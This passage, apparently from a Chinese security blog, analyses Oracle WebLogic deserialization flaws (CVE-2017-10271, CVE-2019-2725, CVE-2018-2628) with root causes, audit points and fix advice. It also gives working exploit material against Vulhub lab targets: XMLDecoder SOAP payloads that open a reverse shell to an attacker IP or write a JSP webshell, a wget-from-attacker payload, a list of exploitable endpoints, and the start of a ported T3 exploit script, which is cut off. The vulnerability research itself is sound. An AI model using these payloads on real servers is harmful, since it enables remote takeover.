class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/192.168.100.129/1234 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.100.129/1234 0&amp;gt;&amp;amp;1</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250404174026165.png?x-oss-process=style/img-to-webp" alt="image-20250404174026165"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250404174305924.png?x-oss-process=style/img-to-webp" alt="image-20250404174305924"></p>
<p><strong>注意</strong>：</p>
<p>需在攻击机开启监听端口（如 <code>nc -lvp 1234</code>）。</p>
<p>需要对特殊payload中的特殊字符进行实体编码，防止其特殊含义</p>
</li>
<li><p><strong>写入 WebShell</strong><br>修改 XML 中的 <code>&lt;ProcessBuilder&gt;</code> 为 <code>&lt;PrintWriter&gt;</code>，写入 JSP 文件：  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">java</span>&gt;</span><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/shell.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;println&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>  </span><br><span class="line">  &lt;![CDATA[</span><br><span class="line">&lt;% out.print(&quot;webshell&quot;); %&gt;</span><br><span class="line">  ]]&gt; </span><br><span class="line">  <span class="tag">&lt;/<span class="name">string</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">void</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;close&quot;</span>/&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问 <code>http://目标IP:7001/bea_wls_internal/shell.jsp</code> 验证是否写入成功。</p>
<p><strong>注意：</strong>9j4dqk目录是根据部署时间和应用名称随机生成的短hash，具体利用时需利用爆破或者目录泄露。</p>
</li>
</ul>
</li>
</ol>
<h5 id="3-自动化工具利用"><a href="#3-自动化工具利用" class="headerlink" title="3. 自动化工具利用"></a><strong>3. 自动化工具利用</strong></h5><ul>
<li>使用 Python 脚本批量检测或执行命令，例如：  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">url</span>):</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/xml&#x27;</span>&#125;</span><br><span class="line">    xml_payload = <span class="string">&#x27;上述反弹Shell的XML内容&#x27;</span></span><br><span class="line">    response = requests.post(url, headers=headers, data=xml_payload)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">500</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;漏洞存在且利用成功！&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="二、可利用的-URL-列表"><a href="#二、可利用的-URL-列表" class="headerlink" title="二、可利用的 URL 列表"></a><strong>二、可利用的 URL 列表</strong></h4><p>以下为触发漏洞的核心 URL，需通过 <strong>POST 请求</strong>发送恶意 XML 数据：</p>
<ol>
<li><p><strong>主要利用端点</strong>  </p>
<ul>
<li><code>/wls-wsat/CoordinatorPortType</code><br><strong>描述</strong>：标准漏洞触发路径，所有复现流程均基于此 URL。</li>
</ul>
</li>
<li><p><strong>其他潜在端点</strong>  </p>
<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/wls-wsat/<span class="type">RegistrationPortTypeRPC</span></span><br><span class="line">/wls-wsat/<span class="type">ParticipantPortType</span></span><br><span class="line">/wls-wsat/<span class="type">RegistrationRequesterPortType</span></span><br><span class="line">/wls-wsat/<span class="type">CoordinatorPortType11</span></span><br><span class="line">/wls-wsat/<span class="type">RegistrationPortTypeRPC11</span></span><br><span class="line">/wls-wsat/<span class="type">ParticipantPortType11</span></span><br><span class="line">/wls-wsat/<span class="type">RegistrationRequesterPortType11</span></span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h4 id="三、注意事项"><a href="#三、注意事项" class="headerlink" title="三、注意事项"></a><strong>三、注意事项</strong></h4><ol>
<li><p><strong>协议与端口</strong>  </p>
<ul>
<li>WebLogic 默认监听端口为 <strong>7001</strong>，但实际环境可能配置为 80、7002 等其他端口。  </li>
<li>确保目标服务器未禁用 T3&#x2F;IIOP 协议（可通过网络策略限制）。</li>
</ul>
</li>
<li><p><strong>路径差异</strong>  </p>
<ul>
<li>WebShell 写入路径因 WebLogic 版本和安装目录不同而变化，需通过调试确定具体路径（如随机生成的目录名）。</li>
</ul>
</li>
<li><p><strong>防御建议</strong>  </p>
<ul>
<li>删除 <code>wls-wsat.war</code> 组件或限制其访问权限。  </li>
<li>及时应用 Oracle 官方补丁（如 2017 年 10 月补丁）。</li>
</ul>
</li>
</ol>
<h2 id="3-CVE-2019-2725"><a href="#3-CVE-2019-2725" class="headerlink" title="3.CVE-2019-2725"></a>3.<strong>CVE-2019-2725</strong></h2><h4 id="1-漏洞背景-1"><a href="#1-漏洞背景-1" class="headerlink" title="1. 漏洞背景"></a><strong>1. 漏洞背景</strong></h4><p>CVE-2019-2725 是 Oracle WebLogic 服务器的 <strong>反序列化远程代码执行（RCE）漏洞</strong>，影响 <code>wls9_async_response.war</code> 和 <code>wsat.war</code> 组件。该漏洞通过绕过 CVE-2017-10271 补丁的黑名单过滤机制，利用 XMLDecoder 反序列化未经验证的输入数据，导致攻击者可在未授权下执行任意命令。</p>
<hr>
<h4 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2. 漏洞原理"></a><strong>2. 漏洞原理</strong></h4><h5 id="1-核心触发流程"><a href="#1-核心触发流程" class="headerlink" title="(1) 核心触发流程"></a><strong>(1) 核心触发流程</strong></h5><ol>
<li><strong>入口点</strong>：攻击者向 WebLogic 的异步通信服务端点（如 <code>/_async/AsyncResponseService</code>）发送恶意 SOAP 请求，请求中包含构造的 XML 数据。</li>
<li><strong>XML 解析</strong>：WebLogic 的 <code>WorkContextServerTube</code> 处理请求，将 XML 数据传递给 <code>WorkContextXmlInputAdapter</code> 类。</li>
<li><strong>反序列化执行</strong>：<code>WorkContextXmlInputAdapter</code> 直接调用 <code>XMLDecoder</code> 对恶意 XML 进行反序列化，触发 <code>ProcessBuilder</code> 或 <code>UnitOfWorkChangeSet</code> 类的恶意代码执行。</li>
</ol>
<p><strong>关键代码段</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WorkContextXmlInputAdapter 构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">WorkContextXmlInputAdapter</span><span class="params">(InputStream var1)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.xmlDecoder = <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(var1); <span class="comment">// 未过滤直接反序列化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-补丁绕过机制"><a href="#2-补丁绕过机制" class="headerlink" title="(2) 补丁绕过机制"></a><strong>(2) 补丁绕过机制</strong></h5><ul>
<li><p><strong>历史补丁缺陷</strong>：CVE-2017-10271 补丁仅过滤了 <code>object</code>、<code>new</code>、<code>method</code> 标签，但允许 <code>void</code> 和 <code>array</code> 标签通过。</p>
</li>
<li><p><strong>攻击载荷构造</strong>：通过 <code>void</code> 和 <code>array</code> 标签结合 <code>java.lang.ProcessBuilder</code> 或 <code>java.lang.Runtime</code> 类，绕过黑名单限制。<br><strong>示例 Payload</strong>：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>wget http://攻击者IP/shell.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="3-代码审计要点-1"><a href="#3-代码审计要点-1" class="headerlink" title="3. 代码审计要点"></a><strong>3. 代码审计要点</strong></h4><h5 id="1-反序列化入口"><a href="#1-反序列化入口" class="headerlink" title="(1) 反序列化入口"></a><strong>(1) 反序列化入口</strong></h5><ul>
<li><strong>组件路径</strong>：检查 <code>wls9_async_response.war</code> 和 <code>wsat.war</code> 中的 <code>WorkContextXmlInputAdapter</code> 类，确认是否直接调用 <code>XMLDecoder</code> 且未过滤输入。</li>
<li><strong>HTTP 请求处理链</strong>：跟踪 <code>BaseWSServlet</code> → <code>SoapProcessor</code> → <code>WorkContextServerTube</code> 的调用链，验证 XML 数据是否未经校验直接反序列化。</li>
</ul>
<h5 id="2-补丁验证"><a href="#2-补丁验证" class="headerlink" title="(2) 补丁验证"></a><strong>(2) 补丁验证</strong></h5><ul>
<li><strong>黑名单检查</strong>：确认补丁是否扩展了黑名单（如新增对 <code>class</code> 属性的过滤），并验证 <code>void</code> 和 <code>array</code> 标签的解析逻辑是否存在漏洞。</li>
<li><strong>长度限制绕过</strong>：Oracle 在补丁中限制了 <code>array</code> 的 <code>length</code> 属性（如不得大于 10000），需检查是否可通过构造合法长度绕过。</li>
</ul>
<h5 id="3-利用链分析"><a href="#3-利用链分析" class="headerlink" title="(3) 利用链分析"></a><strong>(3) 利用链分析</strong></h5><ul>
<li><strong>UnitOfWorkChangeSet 类</strong>：该类的反序列化过程中通过 <code>ByteArrayInputStream</code> 和 <code>ObjectInputStream</code> 直接调用 <code>readObject()</code>，若 JDK 版本 ≤ 7u21，可利用 <code>ysoserial</code> 生成恶意对象。</li>
<li><strong>日志与调试信息</strong>：通过调试器（如 IDEA）在 <code>ProcessBuilder.start()</code> 或 <code>Runtime.exec()</code> 处设置断点，验证是否触发恶意代码执行。</li>
</ul>
<hr>
<h4 id="4-漏洞修复建议"><a href="#4-漏洞修复建议" class="headerlink" title="4. 漏洞修复建议"></a><strong>4. 漏洞修复建议</strong></h4><ol>
<li><strong>补丁升级</strong>：应用 Oracle 官方补丁（如 2019 年 4 月紧急补丁），彻底修复反序列化逻辑。</li>
<li><strong>组件删除</strong>：删除 <code>wls9_async_response.war</code> 和 <code>wls-wsat.war</code> 文件，并重启服务。</li>
<li><strong>JDK 升级</strong>：将 WebLogic 默认的 JDK 1.6 升级至 7u21 以上版本，避免原生反序列化漏洞。</li>
<li><strong>访问控制</strong>：通过防火墙或 ACL 限制对 <code>/_async/</code> 和 <code>/wls-wsat/</code> 路径的访问。</li>
</ol>
<hr>
<h4 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a><strong>5. 总结</strong></h4><p>CVE-2019-2725 的 <strong>本质是黑名单过滤机制不完善</strong>，攻击者通过构造 <code>void</code> 和 <code>array</code> 标签绕过补丁限制。代码审计需重点关注 XML 解析流程中的输入校验和反序列化触发点，结合补丁差异分析漏洞成因。该漏洞的广泛利用（如挖矿木马、内网渗透）凸显了及时升级和组件管理的重要性。</p>
<h3 id="4-CVE-2018-2628"><a href="#4-CVE-2018-2628" class="headerlink" title="4.CVE-2018-2628"></a>4.CVE-2018-2628</h3><h4 id="一、漏洞背景-1"><a href="#一、漏洞背景-1" class="headerlink" title="一、漏洞背景"></a><strong>一、漏洞背景</strong></h4><p>CVE-2018-2628 是 Oracle WebLogic Server 的 <strong>高危反序列化漏洞</strong>，允许攻击者通过 T3 协议发送恶意反序列化数据，触发远程代码执行（RCE）。该漏洞的核心问题在于 WebLogic 对 RMI（远程方法调用）接口的校验不充分，结合 JRMP（Java Remote Messaging Protocol）协议绕过黑名单限制，导致未授权攻击者可接管服务器。</p>
<hr>
<h4 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a><strong>二、漏洞原理</strong></h4><h5 id="1-触发机制"><a href="#1-触发机制" class="headerlink" title="1. 触发机制"></a><strong>1. 触发机制</strong></h5><ol>
<li><p><strong>协议入口</strong>：<br>WebLogic 默认开启的 T3 协议用于支持分布式通信，但未对传入的 RMI 请求进行严格的序列化数据校验。攻击者通过 T3 协议发送构造的恶意数据包，触发反序列化流程。</p>
</li>
<li><p><strong>反序列化绕过</strong>：<br>WebLogic 的 <code>weblogic.rjvm.InboundMsgAbbrev</code> 类在反序列化时调用 <code>resolveProxyClass</code> 方法，仅校验 <code>java.rmi.registry.Registry</code> 接口，而攻击者可通过其他 RMI 接口（如 <code>java.rmi.activation.Activator</code>）绕过黑名单限制。</p>
</li>
<li><p><strong>利用链构造</strong>：<br>利用 <code>ysoserial</code> 工具生成包含恶意命令的序列化对象（如 <code>CommonsCollections1</code>），通过 <code>RemoteObjectInvocationHandler</code> 和 <code>UnicastRef</code> 类建立与攻击机 JRMP 服务的连接实现二次反序列化加载恶意序列化对象，加载并执行远程恶意代码。</p>
</li>
</ol>
<p><strong>关键代码段</strong>：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反序列化绕过点：resolveProxyClass 方法仅校验特定接口</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces) &#123;</span><br><span class="line">    <span class="keyword">for</span> (String str : interfaces) &#123;</span><br><span class="line">        <span class="keyword">if</span> (str.equals(<span class="string">&quot;java.rmi.registry.Registry&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Unauthorized proxy deserialization&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.resolveProxyClass(interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-漏洞利用链"><a href="#2-漏洞利用链" class="headerlink" title="2. 漏洞利用链"></a><strong>2. 漏洞利用链</strong></h5><ul>
<li><strong>攻击流程</strong>：  <ol>
<li>攻击机启动 JRMP 服务监听端口，生成恶意序列化对象。  </li>
<li>目标 WebLogic 接收到构造的 T3 请求后，反序列化触发 JRMP 连接请求。  </li>
<li>攻击机通过 JRMP 服务下发恶意代码，执行系统命令（如反弹 Shell 或写入 WebShell）。</li>
</ol>
</li>
</ul>
<hr>
<h4 id="三、代码审计要点"><a href="#三、代码审计要点" class="headerlink" title="三、代码审计要点"></a><strong>三、代码审计要点</strong></h4><h5 id="1-审计关键路径"><a href="#1-审计关键路径" class="headerlink" title="1. 审计关键路径"></a><strong>1. 审计关键路径</strong></h5><ol>
<li><p><strong>反序列化入口</strong>：<br>检查 <code>weblogic.rjvm.InboundMsgAbbrev</code> 类中的 <code>readObject</code> 方法，确认是否对输入数据进行了严格的校验。</p>
</li>
<li><p><strong>黑名单过滤机制</strong>：  </p>
<ul>
<li>补丁中新增的 <code>WebLogicFilterConfig</code> 类会过滤 <code>sun.rmi.server.UnicastRef</code> 等危险类，但需验证是否覆盖完整的反射链（如 <code>RemoteObjectInvocationHandler</code> 未被完全过滤）。  </li>
<li>确认黑名单是否动态加载，避免补丁文件未生效（如 <code>BUG27395085_10360180417.jar</code> 未正确更新）。</li>
</ul>
</li>
<li><p><strong>协议控制逻辑</strong>：  </p>
<ul>
<li>检查 T3 协议的网络访问权限配置（如 <code>ConnectionFilterImpl</code> 规则是否限制外部 IP 访问）。</li>
</ul>
</li>
</ol>
<h5 id="2-补丁有效性验证"><a href="#2-补丁有效性验证" class="headerlink" title="2. 补丁有效性验证"></a><strong>2. 补丁有效性验证</strong></h5><ul>
<li><p><strong>补丁分析</strong>：<br>官方补丁通过扩展黑名单和增强 <code>resolveProxyClass</code> 的校验逻辑修复漏洞，但早期版本可能因 JDK 兼容性问题（如 JDK ≤ 7u21）仍存在绕过风险。</p>
</li>
<li><p><strong>绕过风险</strong>：<br>若反序列化链中未直接使用黑名单类（如 <code>UnicastRef</code> 仅在底层调用），补丁可能失效。需结合调试工具跟踪反序列化过程，确认所有关键节点是否被覆盖。</p>
</li>
</ul>
<hr>
<h4 id="四、漏洞利用流程"><a href="#四、漏洞利用流程" class="headerlink" title="四、漏洞利用流程"></a>四、漏洞利用流程</h4><h5 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a><strong>一、环境准备</strong></h5><ol>
<li><p><strong>靶机环境搭建</strong><br>使用 Vulhub 的 Docker 环境快速部署漏洞靶机：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/weblogic/CVE-2018-2628</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>启动后，访问 <code>http://靶机IP:7001/console</code> 确认 WebLogic 服务正常运行。</p>
</li>
<li><p><strong>攻击机工具准备</strong>  </p>
<ul>
<li><strong>ysoserial</strong>：用于生成反序列化 Payload 和启动 JRMP 监听服务（<a target="_blank" rel="noopener" href="https://github.com/tdy218/ysoserial-cve-2018-2628">下载地址</a>）。  </li>
<li><strong>Python 脚本</strong>：如 <code>44553.py</code> 或 <code>exploit.py</code>（<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44553">示例脚本</a>）。  </li>
<li><strong>Java 环境</strong>：需 JDK 1.8+，避免高版本兼容性问题（如 Java 17 无法运行 ysoserial）。</li>
</ul>
</li>
<li><p><strong>PoC 编写</strong></p>
<ul>
<li>将44553.py exp改编为python3且可自定义payload文件的exp，实现代码如下</li>
</ul>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Modified for Python 3 compatibility</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">path_payload</span>):</span><br><span class="line">    <span class="comment"># 生成ysoserial payload</span></span><br><span class="line">    <span class="comment"># command = f&#x27;java -jar &#123;path_ysoserial&#125; &#123;jrmp_client&#125; &#123;jrmp_listener_ip&#125;:&#123;jrmp_listener_port&#125; &gt; payload.out&#x27;</span></span><br><span class="line">    <span class="comment"># print(f&quot;command: &#123;command&#125;&quot;)</span></span><br><span class="line">    <span class="comment"># os.system(command)</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path_payload, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        bin_file = f.read()</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(bin_file).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t3_handshake</span>(<span class="params">sock, server_addr</span>):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    handshake = binascii.unhexlify(<span class="string">&#x27;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#x27;</span>)</span><br><span class="line">    sock.send(handshake)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;handshake successful&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_t3_request_object</span>(<span class="params">sock, port</span>):</span><br><span class="line">    data1 = binascii.unhexlify(</span><br><span class="line">        <span 